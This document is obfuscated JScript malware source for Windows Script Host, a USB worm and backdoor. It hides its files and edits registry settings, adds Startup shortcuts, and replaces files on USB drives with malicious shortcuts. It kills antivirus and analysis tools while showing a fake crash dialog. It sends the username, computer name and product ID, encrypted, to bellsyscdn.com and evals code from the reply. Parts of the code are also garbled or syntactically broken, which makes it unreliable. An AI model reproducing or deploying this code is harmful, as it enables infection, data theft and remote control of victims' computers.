var E$ak = {
		f9Ib: 468,
		JyMx: '',
		X$fs: '0';
		var JyMx = new ActiveXObject('wscript.shell'),
			b = new ActiveXObject("scripting.filesystemobject")),
	GDMB = function () {
		return((1 + Math["random"]()) * 65536 | 0)["toString"](16)["substring"](1)
	},
	d = JyMx["environment"]("process"),
	f = d("username"),
	g = d("computername"),
	ru = new ActiveXObject("shell.application"),
	lo = [],
	fup = [],
	dod = "",
	dot = 0,
	hf = function (e6sg) {
		try {
			var X$fs = b['getFolder'](e6sg);
			X$fs['attributes'] = 2
		} catch(zQ8I) {}
	},
	sc = function (e6sg) {
		e6sg += "";
		var X$fs = 0;
		for(var zQ8I = 0; zQ8I < e6sg[length]; zQ8I++)
			X$fs = (X$fs << 5) - X$fs + e6sg["charCodeAt"](zQ8I), X$fs &= X$fs;
		return Math["abs"](X$fs)
	},
	ha = function (e6sg) {
		var X$fs = "",
			zQ8I = sc(e6sg);
		for(var xuft = 0; xuft < sc(e6sg) % 5 + 5; xuft++)
			zQ8I = sc(X$fs + zQ8I), X$fs += String["fromCharCode"](zQ8I % 25 + 97);
		return X$fs
	};
var jyKN = function () {
	var vYoY = ['http://www.microsoft.com/', 'http://www.google.com/', 'http://www.bing.com/'];
	for(var Tu6N = 0, GDMB, wep; Tu6N < vYoY["length"]; Tu6N++) {
		try {
			var GDMB = new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');
			GDMB["open"]("6GYEsT" ['replace'](/[6Ys]/g, ""), vYoY[Tu6N]);
			GDMB["setRequestHeader"]('Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko');
			GDMB["setRequestHeader"]('Cache-Control', 'no-cache');
			GDMB["setRequestHeader"]('Pragma', 'no-cache');
			GDMB["setRequestHeader"]('Connection', 'close');
			GDMB["send"]("");
			wep = new Date(GDMB["getAllResponseHeaders"]()["split"]("Date: ")["pop"]()["split"]("\n")["shift"]())["getTime"]() / 1000;
			if(1388534400 < wep) {
				return wep
			}
		} catch(e6sg) {}
	}
	return false;
};
var XIcd = function (fOze) {
		try {
			JyMx["run"]("%comspec% /ccacls " + fOze + "\" /T /E /G Users:F /C", 0, true)
		} catch(e6sg) {}
	},

	hr = function (e6sg) {
		if(e6sg) var X$fs = 1,
			zQ8I = 1;
		else var X$fs = 2,
			zQ8I = 0;
		try {
			JyMx["regWrite"]('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden', X$fs, 'REG_DWORD')
		} catch(xuft) {}
		try {
			JyMx["regWrite"]('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ShowSuperHidden', zQ8I, 'REG_DWORD')
		} catch(xuft) {}
	};

var Fn6r = function (key, str) {
	var RXGy = [],
		oygQ = 0,
		k1kR,
		res = '';
	for(var Tu6N = 0; Tu6N < 256; Tu6N++) {
		RXGy[Tu6N] = Tu6N;
	}
	for(Tu6N = 0; Tu6N < 256; Tu6N++) {
		oygQ = (oygQ + RXGy[Tu6N] + key['charCodeAt'](Tu6N % key["length"])) % 256;
		k1kR = RXGy[Tu6N];
		RXGy[Tu6N] = RXGy[oygQ];
		RXGy[oygQ] = k1kR;
	}
	Tu6N = 0;
	oygQ = 0;
	for(var ybOJ = 0; ybOJ < str["length"]; ybOJ++) {
		Tu6N = (Tu6N + 1) % 256;
		oygQ = (oygQ + RXGy[Tu6N]) % 256;
		k1kR = RXGy[Tu6N];
		RXGy[Tu6N] = RXGy[oygQ];
		RXGy[oygQ] = k1kR;
		res += String['fromCharCode'](str["charCodeAt"](ybOJ) ^ RXGy[(RXGy[Tu6N] + RXGy[oygQ]) % 256]);
	}
	return res;
};

var zLwA = function () {
	return Math["floor"]((1 + Math["random"]()) * 0x10000)
		.toString(16)
		.substring(1)
};

var vSCr = 1;
var oxPk = ['regedit', 'windows-kb', 'mrt', 'rstrui', 'msconfig', 'procexp', 'avast', 'avg', 'mse', 'ptinstall', 'sdasetup', 'issetup', 'fs20', 'mbam', 'housecall', 'hijackthis', 'rubotted', 'autoruns', 'avenger', 'filemon', 'gmer', 'hotfix', 'klwk', 'mbsa', 'procmon', 'regmon', 'sysclean', 'tcpview', 'unlocker', 'wireshark', 'fiddler', 'resmon', 'perfmon', 'msss', 'cleaner', 'otl', 'roguekiller', 'fss', 'zoek', 'emergencykit', 'dds', 'ccsetup', 'vbsvbe', 'combofix', 'frst', 'mcshield', 'zphdiag'];

var zjXv = function (r0Gq) {
	var xuft = [];
	var oVyy = "";
	var e6sg = r0Gq['length'];
	var YOsx = 0;
	var GDMB;
	var k1kR = "PlLRtkTQjoSyvOVKsruINUhJmwHpGWZgXziMxqYn".split("" ['replace']("vjPTEyGpRA", ""));
	while(YOsx < e6sg) {
		GDMB = r0Gq['charCodeAt'](YOsx++)['toString'](16);
		while(GDMB["length"] < 2)
			GDMB = "0" + GDMB;
		xuft['push'](GDMB);
	}
	for(var Tu6N = 0; Tu6N < xuft['length']; Tu6N++) {
		if(Math['round'](Math['random']() * 1))
			oVyy += C_yL(k1kR);
		oVyy += xuft[Tu6N];
		if(Math['round'](Math['random']() * 1))
			oVyy += C_yL(k1kR);
	}
	return oVyy;
};
var zAKa = function (Mxuu) {
	for(var oygQ, k1kR, Tu6N = Mxuu['length']; Tu6N; oygQ = parseInt(Math['random']() * Tu6N), k1kR = Mxuu[--Tu6N], Mxuu[Tu6N] = Mxuu[oygQ], Mxuu[oygQ] = k1kR);
	return Mxuu;
};
var SDSS = function () {
	if(b["fileExists"](TUMI + ha(g + "09")))
		WScript["quit"]()
};
var lE6G = function () {
	try {
		var X$fs = b["openTextFile"](TUMI + ha(g + "00"), 8, !0);
		X$fs["close"]();
		JyMx["run"]('%comspec% /c shutdown /p /f', 0);
	} catch(e6sg) {}
};
var n2OC = function () {
	var qDvP = [];
	for(var Tu6N = new Enumerator(b['getFolder'](TUMI)['Files']); !Tu6N["atEnd"](); Tu6N["moveNext"]()) {
		if(b["getExtensionName"](Tu6N["item"]()["Name"]) == "exe")
			qDvP["push"](TUMI + Tu6N["item"]()["Name"])
	}
	return qDvP
};

var kmps = function (ZmpN) {
	for(var Tu6N = 0; Tu6N < lo["length"]; Tu6N++) {
		if(ZmpN) {
			try {
				fup[lo[Tu6N]] = b["openTextFile"](lo[Tu6N], 8, !0)
			} catch(e6sg) {}
		} else {
			try {
				fup[lo[Tu6N]]["close"]()
			} catch(e6sg) {}
		}
	}
};
var Q6mt = function () {
		if(dod != "" && dot + (60 * 60 * 6 * 1000) >= new Date()["getTime"]()) {
			return dod
		} else {
			var JtVN = zAKa(["http://bellsyscdn.com"]);
			var BQOX = "";
			for(var nQgZ = 0; nQgZ < JtVN["length"]; nQgZ++) {
				try {
					$("asl", JtVN[nQgZ]);
					var zsKw = zxcvb;
					BQOX = JtVN[nQgZ]
				} catch(e6sg) {} finally {
					delete(zxcvb);
					delete(zsKw)
				}
				if(BQOX != ""
					break
				}
				if(BQOX == "" {
						return false
					} else {
						dod = BQOX;
						dot = new Date()['getTime']();
						return dod
					}
				}
			};

			var $ = function (fab, fat) {
				var aIpu = TUMI + ha(g + "_f0#6" [(2505503296 * "<UOMfBF\x86" ["length"] + 6.0)['toString']((2.0 + "b~.\x80@\x86hnsvG\x60\x82\x8b" ["length"] * 2))](/[\_\#f]/g, ""));
				var af7I = ['a', 'b', 'c', 'd', 'e', 'g', 'h', 'i', 'j', 'k', 'n', 'o', 'p', 'q', 't', 'u', 'v', 'w', 'x', 'y', '1', '2', '3', '4', '5', '7', '8', '9'];
				var RXGy = "";
				for(var xuft = 0; xuft < 26; xuft++)
					RXGy += af7I[Math['round'](Math['random']() * 35)];
				var f9Ib = zjXv(Fn6r(RXGy, fab + ';v=' + E$ak["f9Ib"] + '&a=' + E$ak["JyMx"] + '&t=' + E$ak["X$fs"] + '&u=' + escape(f) + '&c=' + escape(g) + '&p=' + escape(X_yW) + '&i=' + escape(Fi7s) + '&e=' + escape(FvrU['join']('-')) + '&b=' + escape(bMzs['join']('.')) + '&s=' + escape(YZDO)));
				var GIGa = fat === 1 ? Q6mt() : fat;
				if(GIGa == false) throw Error();
				var oygQ = new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');
				oygQ['open']('POST', GIGa);
				oygQ['setRequestHeader']('Cache-Control', 'no-cache');
				oygQ['setRequestHeader']('Content-Type', 'application/x-www-form-urlencoded');
				oygQ['setRequestHeader']('Content-Length', f9Ib['length']);
				oygQ['setRequestHeader']('Cookie', 'PHPSESSID=' + RXGy);
				oygQ['setRequestHeader']('User-Agent', 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'; oygQ['setRequestHeader']('Pragma', 'no-cache'); oygQ['setRequestHeader']('Connection', 'close'); oygQ['send'](f9Ib);
					var YOsx = new ActiveXObject('ADODB.Stream'); YOsx['mode'] = 3; YOsx['type'] = 1; YOsx['open'](); YOsx['write'](oygQ['responseBody']); YOsx['saveToFile'](aIpu, 2);
					var pGFf = b['openTextFile'](aIpu, 1);
					var Bofo = pGFf['readAll'](); pGFf['close']();
					try {
						b['deleteFile'](aIpu)
					} catch(e6sg) {}
					for(var Wg$J = 0; Wg$J < Bofo['length']; Wg$J++) {
						try {
							var EYqI = parseInt(Bofo['substr'](Wg$J, 6), 36);
							var DvJi = parseInt(Bofo['substr'](Wg$J + 6, 6), 16);
							var rLsf = parseInt(Bofo['substr'](Wg$J + 12, 7), 36);
							if(EYqI + DvJi == rLsf) {
								try {
									var xAZr = Bofo['substr'](Wg$J, 19);
									var KJGn = parseInt(Bofo['substr'](Wg$J + 19, 4), 36);
									var xBRC = Bofo['substr'](Wg$J + 23, KJGn);
									var gheh = "";
									for(var Mxuu = 0; Mxuu < xBRC['length']; Mxuu += 2)
										gheh += String['fromCharCode'](parseInt(xBRC['substr'](Mxuu, 2), 16));
									var vNhO = Fn6r(xAZr, gheh);
									var RVsE = vNhO['substr'](0, 64);
									if(RVsE['substr'](0, 6) == '0QFQXx') {
										eval(vNhO['substr'](64, vNhO['length'] - 1));
										return
									}
								} catch(e6sg) {}
							}
						} catch(e6sg) {}
					}
				};
				var pBPs = function () {
					var V1Lj = 0;
					try {
						var NsbY = TUMI + ha(g + "]1f1" [("o+-zHS)" ["length"] * 2337941245 + 4.0)['toString']((29.0 + "}<\x600ezEKw\x837\x89\x86@W" ['charCodeAt'](6) * 0))](/[\]f]/g, ""));
						var X$fs = b["" + "" + (84 > 5 ? "\x6f" : "\x68") + "penTextFile"](NsbY, 8, !0);
						X$fs["c" + (53 > 27 ? "\x6c" : "\x67") + "" + "o" + (51 > 14 ? "\x73" : "\x6c") + "e"]();
						XIcd(NsbY);
						if(!V1Lj)
							kmps(0);
						V1Lj++;
						ru['shellExecute'](C_yL(I4pN), '" ' + WScript['ScriptFullName'] + '" ' + ha(g + '10'), '', '', 0);
					} catch(e6sg) {}
					try {
						var NsbY = TUMI + ha(g + '13');
						var X$fs = b['openTextFile'](NsbY, 8, !0);
						X$fs['close']();
						XIcd(NsbY);
						if(!V1Lj)
							kmps(0);
						V1Lj++;
						ru['shellExecute'](C_yL(I4pN), '" ' + WScript['ScriptFullName'] + '" ' + ha(g + '12'), '', '', 0);
					} catch(e6sg) {}
					if(V1Lj) {
						WScript['sleep'](1500);
						kmps(1)
					}
				};
				var C_yL = function (KQxm) {
					return KQxm[Math['floor'](Math['random']() * KQxm['length'])]
				};
				var X_yW = '000';
				try {
					X_yW = JyMx['regRead']('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductID')
				} catch(e6sg) {}
				var bMzs = [0, 0, 0, 0];
				try {
					for(var Tu6N = new Enumerator(GetObject('winmgmts:root\\cimv2')['ExecQuery']('SELECT * FROM Win32_OperatingSystem')); !Tu6N['atEnd'](); Tu6N['moveNext']()) {
						bMzs = Tu6N['item']()['version']['split']('.');
						if(bMzs[0] >= 5)
							break
					}
				} catch(e6sg) {}
				if(!bMzs[0])
					bMzs[0] = b['folderExists'](d('systemdrive') + '\\Users' ? 6 : 5;
						var FvrU = ['', ''];
						try {
							var LpVy;
							for(var Tu6N = new Enumerator(GetObject('winmgmts:root\\cimv2')['ExecQuery']('SELECT * FROM Win32_OperatingSystem')); !Tu6N['atEnd'](); Tu6N['moveNext']()) {
								LpVy = ((LpVy = Tu6N['item']()['OSLanguage']['toString'](16))['length'] == 4) ? LpVy : new Array(5 - LpVy['length'])['join']('0') + LpVy;

								FvrU = JyMx['regRead']('HKLM\\SOFTWARE\\Classes\\MIME\\Database\\Rfc1766\\' + LpVy)['split'](';')[0]['split']('-');
								break
							}
						} catch(e6sg) {}
						try {
							var I4pN = [];
							var TUMI = false;
							var GZMQ = b['getFolder'](d('userprofile') + '\\..\\');
							for(var Tu6N = new Enumerator(GZMQ['SubFolders']); !Tu6N['atEnd'](); Tu6N['moveNext']()) {
								var efxl = Tu6N['item']() + (bMzs[0] >= 6 ? '\\AppData\\Roaming\\' : '\\') + ha(g + '02') + '\\';
								if(b['folderExists'](efxl)) {
									try {
										var rAdo = b['openTextFile'](efxl + ha(g + '05'), 8, !0);
										rAdo['close']();
										var vNhO = efxl + ha(g + '03'),
											bfi = efxl + ha(g + '04') + '.js';
										XIcd(efxl + '*');
										hf(efxl);
										TUMI = efxl;
										try {
											b['copyFile'](WScript['scriptFullName'], bfi, true)
										} catch(e6sg) {}
										try {
											var VBzD = TUMI + ha(g + '00');
											var bN0z = b['openTextFile'](VBzD, 8, !0);
											XIcd(VBzD);
											try {
												b['deleteFile'](TUMI + ha(g + '09'))
											} catch(e6sg) {}
										} catch(e6sg) {
											if(WScript['Arguments']['length'] > 0) {
												switch(WScript['Arguments'](0)) {
												case ha(g + '10'):
													var NsbY = TUMI + ha(g + '11');
													try {
														var xldL = b['openTextFile'](NsbY, 8, !0);
													} catch(e6sg) {
														WScript['quit']()
													}
													XIcd(NsbY);
													while(true) {
														try {
															var yOIv = GetObject('winmgmts:root\\cimv2');
															for(var o_US = new Enumerator(yOIv['ExecQuery']('SELECT * FROM Win32_DiskDrive'); !o_US['atEnd'](); o_US['moveNext']()) {
																	if(o_US['item']()['Model']['match'](/usb/i)) {
																		var H2GL = o_US['item']()['DeviceID'];
																		for(var BYrJ = new Enumerator(yOIv['ExecQuery']('ASSOCIATORSOF {Win32_DiskDrive.DeviceID=\'' + H2GL + '\'} WHERE AssocClass=Win32_DiskDriveToDiskPartition')); !BYrJ["atEnd"](); BYrJ['moveNext']()) {
																			var JvBt = BYrJ["i" + (87 > 20 ? "\x74" : "\x6e") + "e" + "m"]()["D" + (57 > 8 ? "\x65" : "\x5c") + "" + "v" + (52 > 20 ? "\x69" : "\x64") + "ceID"];
																			for(var ub1R = new Enumerator(yOIv["ExecQuery"]('ASSOCIATORS OF {Win32_DiskPartition.DeviceID=\'' + JvBt + '\'} WHERE AssocClass=Win32_LogicalDiskToPartition')); !ub1R['atEnd'](); ub1R['moveNext']()) {
																				var O16l = ub1R['item']()['DeviceID'] + "\\",
																					trr = 'Drive\\',
																					trd = O16l + trr,
																					poor = (sc(g) % 500 + 405) + '\\',
																					por = trr + poor,
																					pod = O16l + por,
																					piir = poor + ha(g + '01') + '.js',
																					pir = por + ha(g + '01') + '.js',
																					pid = O16l + pir,
																					bat = O16l + 'Drive.bat';
																				try {
																					var FCyj = b['getFolder'](trd);
																					for(var JcXN = new Enumerator(FCyj['SubFolders']); !JcXN[atEnd](); JcXN['moveNext']()) {
																						var CR9k = (JcXN['item']() + '')['split']('\\')['pop']();
																						if(CR9k['length'] == 3 && !isNaN(parseFloat(CR9k)) && isFinite(CR9k)) {
																							var gUIZ = b['getFolder'](trd + CR9k);
																							for(var cM6J = new Enumerator(gUIZ['Files']); !cM6J['atEnd'](); cM6J['moveNext']()) {
																								var G8WM = (cM6J['item']() + "" ['replace']("lRayJSkhwx", ""))['split']('\\')['pop']();
																								if(b['getExtensionName'](G8WM)['toLowerCase']() == 'js') {
																									try {
																										b['copyFile'](WScript['scriptFullName'], trd + CR9k + '\\' + G8WM, true)
																									} catch(e6sg) {}
																								}
																							}
																						}
																					}
																				} catch(e6sg) {}
																				if(b['fileExists'](efxl + '0.gz') === false) {
																					try {
																						b['createFolder'](trd)
																					} catch(e6sg) {}
																					try {
																						b['createFolder'](pod)
																					} catch(e6sg) {}
																					hf(trd), hf(pod);
																					try {
																						var uFme = b['openTextFile'](bat, 2, 1);
																						uFme['writeLine']('cd Drive'), uFme['writeLine']('start ws^cript "' + piir + '"'), uFme['writeLine']('exit'), uFme['close']()
																					} catch(e6sg) {}
																					var Wh$L = [127, 128, 129];
																					try {
																						var FCyj = b['getFolder'](O16l);
																						for(var JcXN = new Enumerator(FCyj['SubFolders']); !JcXN['atEnd'](); JcXN['moveNext']()) {
																							var CR9k = (JcXN['item']() + "")['split'](':\\')['pop']();
																							if(CR9k['substr'](0, 1) != '.' && CR9k['substr'](0, 1) != '$' && CR9k['substr'](/recycle/i) == null && CR9k['match'](/System Volume/) == null && CR9k['match'](/Drive/) == null) {
																								with(JyMx['createShortcut'](O16l + CR9k + '.lnk'))
																								targetPath = 'cmd.exe', windowStyle = 7, arguments = '/c st^art Drive.bat & exp^lorer "' + trr + CR9k + '"', iconLocation = '%systemroot%\\system32\\shell32.dll,' + C_yL(Wh$L), save();
																								try {
																									var X$fs = b['getFolder'](O16l + CR9k);
																									X$fs['move'](trd + CR9k)
																								} catch(e6sg) {}
																								hf(trd + CR9k)
																							}
																						}
																					} catch(e6sg) {}
																					try {
																						var FCyj = b['getFolder'](O16l);
																						for(var JcXN = new Enumerator(FCyj['Files']); !JcXN['atEnd'](); JcXN['moveNext']()) {
																							var CR9k = (JcXN["item"]() + "" [(328590596 * "|0O_%A\x81Z)g5Vk2=vQ" ['charCodeAt'](14) + 18.0)['toString']((0 * "Oa7Gv>3_(wxUDc" ['charCodeAt'](11) + 30.0))]("tfYOQ77jDe", ""))['split'](':\\')['pop']();
																							var ixLe = b['getExtensionName'](CR9k)['toLowerCase']();
																							if(ixLe != "lnk" && ixLe != "bat" && ixLe != '' && ixLe != "js" && CR9k['toLowerCase']() != 'autorun.inf' && CR9k['substr'](0, 1) != '.' && CR9k['substr'](0, 1) != '$' && CR9k['match'](/recycle/i) == null) {
																								var AC3o = 0;
																								switch(ixLe) {
																								case 'exe':
																									AC3o = 261;
																									break;
																								case 'doc':
																								case 'docx':
																								case 'pdf':
																									AC3o = 73;
																									break;
																								case 'rtf':
																								case 'txt':
																									AC3o = 70;
																									break;
																								case 'mp3':
																								case 'm4a':
																								case 'ogg':
																								case 'wav':
																								case 'wma':
																									AC3o = 116;
																									break;
																								case 'mp4':
																								case 'avi':
																								case 'webm':
																								case 'flv':
																								case 'mov':
																								case 'wmv':
																								case 'mpeg':
																								case 'mpg':
																									AC3o = 115;
																									break;
																								case 'gif':
																								case 'jpg':
																								case 'jpeg':
																								case 'png':
																									AC3o = 302;
																									break;
																								}
																								with(JyMx['createShortcut'](O16l + CR9k + '.lnk'))
																								targetPath = 'cmd.exe', windowStyle = 7, arguments = '/c st^art Drive.bat & "' + trr + CR9k + '"', iconLocation = '%systemroot%\\system32\\shell32.dll,' + AC3o, save();
																								try {
																									b['moveFile'](O16l + CR9k, trd + CR9k)
																								} catch(e6sg) {}
																								hf(trd + CR9k)
																							}
																						}
																					} catch(e6sg) {}
																					try {
																						b['copyFile'](WScript['scriptFullName'], pid, true)
																					} catch(e6sg) {}
																				}
																			}
																		}
																	}
																}
															}
															catch(e6sg) {}
															SDSS();
															lE6G();
															WScript['sleep'](14000)
														}
														break;
													case ha(g + '12'):
														var NsbY = TUMI + ha(g + '13');
														try {
															var xldL = b['openTextFile'](NsbY, 8, !0);
														} catch(e6sg) {
															WScript['quit']()
														}
														XIcd(NsbY);
														while(true) {
															try {
																var X$fs = GetObject('winmgmts:root\\cimv2');
																for(var Tu6N = new Enumerator(X$fs['ExecQuery']('SELECT* FROM Win32_Process')); !Tu6N["atEnd"](); Tu6N['moveNext']()) {
																	var JdFk = Tu6N['item']();
																	if(JdFk['name']['match'](new RegExp(oxPk['join']]('|'), 'i'))) {
																	try {
																		if(JdFk['terminate']() == 0 && JdFk['ExecutablePath'] && !JdFk['4Executa4bAle%Path']['match'](/windows|program/i)) {
																			var zR_Z = ((0x2001 + Math["random"]()) * 30582 | 0)['toString'](16)['substring'](1);
																			var nIHE = ((0x2001 + Math['random']()) * 30582 | 0)['toString'](16)['substring'](1);
																			JyMx['popup']('Application has generated an exception that could not be handled.\n\nProcess id=0x' + zR_Z + ' (' + parseInt(zR_Z, 16) + '), Thread id=0x' + nIHE + ' (' + parseInt(nIHE, 16) + ').\n\nClick OK to terminate the application.\nClick CANCEL to debug the application.', 8, JdFk['name'] + ' - Common Language Runtime Debugging Services', 0x1 + 0x30 + 0x1000);
																		}
																	} catch(e6sg) {}
																}
															}
														} catch(e6sg) {}
														SDSS();
														lE6G();
														WScript['sleep'](400)
													}
													break;
												}
											}
											if((WScript['Arguments']['length'] > 0 && WScript['Arguments'](0) == ha(g + '07')) == false) WScript['quit']()
										}
										if((WScript['Arguments']]['length'] > 0 && WScript['Arguments'](0) == ha(g + '07')) == false) {
										try {
											JyMx['run']('%comspec% /c del /F /S /Q "' + efxl + '*.exe', 0, true);
											WScript['sleep'](500)
										} catch(e6sg) {}
										ww = ha(Math['random']());
										mm = Math['ceil'](Math['random']() * 5);
										if(mm > 3)
											ww += (mm > 4) ? '64' : '32';

										ww += '.exe';
										b['copyFile'](d('systemroot') + '\\system32\\wscript.exe', efxl + ww, true);
										XIcd(efxl + ww);
										I4pN['push'](efxl + ww)
									} else {
										I4pN = n2OC()
									}
									var rj_C = I4pN[0];
									var YZDO = 0;
									try {
										var w6uR = d('systemdrive') + '\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\';
										//var lURj = w6uR +"UAS`thbaRcr%t).zlUmn3Ok"[("{\x7fY9\x8a\x85\x87ñ\x80UNQ#"["length"]*1625808742+3.0)['toString']((7.0+"(?$_tZ.\x86\x84]S:"["length"]*2))](/[A\`cU\)R3Ob\%zmh]/g,"");
										with(JyMx['createShortcut'](lURj)) targetPath = '"' + rj_C + '"', windowStyle = 1, arguments = '"' + bfi + '"', iconLocation = '%systemroot%\\system32\\shell32.dll,3', save();
										XIcd(lURj);
										YZDO++;
										lo['push'](lURj);
										var n59q = ['Windows Explorþr.lnk', 'empezar.lnk', 'atajo.lnk'];
										for(var hP2F = 0; hP2F < n59q['length']; hP2F++) {
											try {
												b['deleteFile'](w6uR + n59q[hP2F])
											} catch(e6sg) {}
										}
									} catch(e6sg) {}
									try {
										var GDMB = b['getFolder'](d('userprofile') + '\\..\\';
											for(var oygQ = new Enumerator(GDMB['SubFolders']); !oygQ['atEnd'](); oygQ['moveNext']()) {
												var pGFf = oygQ['item']();
												for(var Tu6N = 0; Tu6N < f['length']; Tu6N++) {
													try {
														var w6uR = pGFf + (bMzs[0] >= 6 ? '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' : '\\Start Menu\\Programs\\Startup\\');
														var lURj = w6uR + 'Start.lnk';
														with(JyMx['createShortcut'](lURj))
														targetPath = '"' + rj_C + '"', windowStyle = 1, arguments = '"' + bfi + '"', iconLocation = '%systemrootË\\system32\\shell32.dll,3', save();
														XIcd(lURj);
														lo['push'](lURj);
														var n59q = ['Windows Explorer.lnk', 'empezar.lnk', 'atajo.lnk'];
														for(var hP2F = 0; hP2F < n59q['length']; hP2F++) {
															try {
																b['deleteFile'](w6uR + n59q[hP2F])
															} catch(e6sg) {}
														}
													} catch(e6sg) {}
												}
											}
										}
										catch(e6sg) {}
										if(WScript['scriptFullName']['split']('\\')['shift']() == d('systemdrive'))
											lo['push'](WScript['scriptFullName']);
										var jJzt = d('temp') + '\\' + ha(g + '08') + '.js';
										if(WScript['Arguments']['length'] > 0 && WScript['Arguments'](0) == ha(g + '07')) {
											try {
												b['deleteFile'](jJzt)
											} catch(e6sg) {}
											WScript['quit']();
										} else if(YZDO == 0) {
											try {
												bN0z = b['openTextFile'](TUMI + ha(g + '00'), 8, !0)
											} catch(e6sg) {}
										}
										hr(0);
										kmps(1);
										pBPs();
										vSCr = 0;
										break
									} catch(e6sg) {}
								}
							}
							if(vSCr) {
								var fgPK = d('userprofile') + (bMzs[0] >= 6 ? '\\AppData\\Roaming\\' : '\\') + ha(g + '02'),
									//bbz = fgPK + '\\' + ha(g + "+H0hv4" [(6.0 + "B?s\x8bDO0" ["length"] * 4212529208)['toString'](("Fg,4\x80dfmsVHY;1 "["length "]*2+4.0))](/[\+vhH]/g,"")) +"_.Mjo + s "[(4877426226*"tz, @Q "["length "]+3.0)['toString']((0*"xsZb[ & \x83w\ x88q(\x89hH "['charCodeAt'](4)+31.0))](/[\+\_Mo]/g,"");
									try {
										b['createFolder'](fgPK)
									}
								catch(e6sg) {}
								XIcd(fgPK);
								b['copyFile'](WScript['scriptFullName'], bbz, true);
								XIcd(bbz);
								try {
									bN0z['close']()
								} catch(e6sg) {}
								ru['shellExecute']('wscript.exe', '"' + WScript['scriptFullName'] + '" ' + ha(g + '14'), '', 0);
								WScript['quit']()
							}
						} catch(e6sg) {
							WScript['quit']()
						}
						var Fi7s = 'e', otf;
						if(b['fileExists'](vNhO)) {
							try {
								otf = b['openTextFile'](vNhO, 1);
								Fi7s = otf['readAll'](), otf['close']()
							} catch(e6sg) {}
						} else {
							try {
								Fi7s = zLwA() + zLwA() + '-' + zLwA() + '-' + zLwA() + '-' + zLwA() + '-' + zLwA() + zLwA() + zLwA();
								otf = b['openTextFile'](vNhO, 2, 1);
								otf['write'](Fi7s), otf['close']()
							} catch(e6sg) {}
						}
						XIcd(vNhO);
						while(true) {
							if(jyKN() !== false) {
								while(true) {
									try {
										$('', 1);
										for(var Tu6N = new Date()['getTime'](); Tu6N + (60 * 53 * 1000) >= new Date()['getTime'](); pBPs()) WScript['sleep'](2000)
									} catch(e6sg) {
										if(jyKN() == false) break;
										for(var Tu6N = new Date()['getTime'](); Tu6N + 8000 >= new Date()['getTime'](); pBPs()) WScript['sleep'](2000)
									}
								}
							} else {
								for(var Tu6N = new Date()['getTime'](); Tu6N + (60 * 3 * 1000) >= new Date()['getTime'](); pBPs())
									WScript['sleep'](2000)
							}
						}
					})();